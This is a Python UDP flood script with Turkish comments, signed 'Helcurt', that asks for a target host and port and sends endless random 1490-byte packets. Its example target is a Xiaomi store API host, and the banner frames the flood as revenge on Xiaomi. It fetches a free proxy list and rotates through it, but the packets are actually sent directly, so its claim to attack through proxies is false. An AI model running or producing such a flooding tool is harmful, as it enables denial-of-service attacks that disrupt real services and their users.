import sys
import os
import time
import socket
import random
import requests
import json
from datetime import datetime

# By Helcurt - Siber Boss Modu
# Ritim: GTA Diplo - Oh Boy 🎧

def mühimmat_topla():
    print("\033[93m[+] 10 Saniye boyunca Proxy mühimmatı toplanıyor ve kaydediliyor...\033[0m")
    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json"
    
    try:
        r = requests.get(api_url)
        if r.status_code == 200:
            data = r.json()
            proxy_list = [p['proxy'] for p in data['proxies']]
            
            # proxy.txt dosyasına kaydetme (Kanki senin isteğin üzerine)
            with open("proxy.txt", "w") as f:
                for proxy in proxy_list:
                    f.write(proxy + "\n")
            
            print(f"\033[92m[+] {len(proxy_list)} adet proxy 'proxy.txt' dosyasına istiflendi!\033[0m")
            time.sleep(10) # 10 saniyelik hazırlık süresi
            return proxy_list
    except Exception as e:
        print(f"\033[91m[-] Mühimmat toplanamadı: {e}\033[0m")
        return []

def attack():
    os.system("clear")
    print("\033[91m")
    print("################################################")
    print("#          BY HELCURT - SIBER VIOLONET         #")
    print("#  'İhtiyar, bu senin kaderindi... Xiaomi Gibi #")
    print("#   Bana Ambargo Çakmak Bunu Sen İstedin İhtiyar' #")
    print("################################################")
    print("\033[0m")
    
    target_ip = input("\033[93mHedef IP (örn: sgp-api.buy.mi.com): \033[0m")
    target_port = int(input("\033[93mHedef Port: \033[0m"))
    
    # Önce mühimmat topla ve kaydet
    proxies = mühimmat_topla()
    
    if not proxies:
        print("Saldırı için proxy bulunamadı!")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_bytes = random._urandom(1490) # hammer.py mirası
    
    proxy_index = 0
    sent_packets = 0

    print(f"\033[92m\n[!] Taarruz Başladı! Ritme odaklan... 🎧\033[0m")
    
    while True:
        try:
            current_proxy = proxies[proxy_index]
            
            # UDP Paket Gönderimi (Proxy üzerinden hedef darlama)
            sock.sendto(packet_bytes, (target_ip, target_port))
            sent_packets += 1
            
            print(f"\033[94m[{sent_packets}] Paket Gönderildi -> Kullanılan Proxy: {current_proxy}\033[0m", end="\r")
            
            # Ban yeme ihtimaline karşı her 50 pakette bir proxy değiştir
            if sent_packets % 50 == 0:
                proxy_index = (proxy_index + 1) % len(proxies)
                
        except KeyboardInterrupt:
            print("\n\033[91m[!] Operasyon By Helcurt tarafından durduruldu.\033[0m")
            break
        except Exception:
            # IP Banlanırsa veya bağlantı koparsa saniyesinde ötekine geç!
            proxy_index = (proxy_index + 1) % len(proxies)
            continue

if __name__ == "__main__":
    attack()
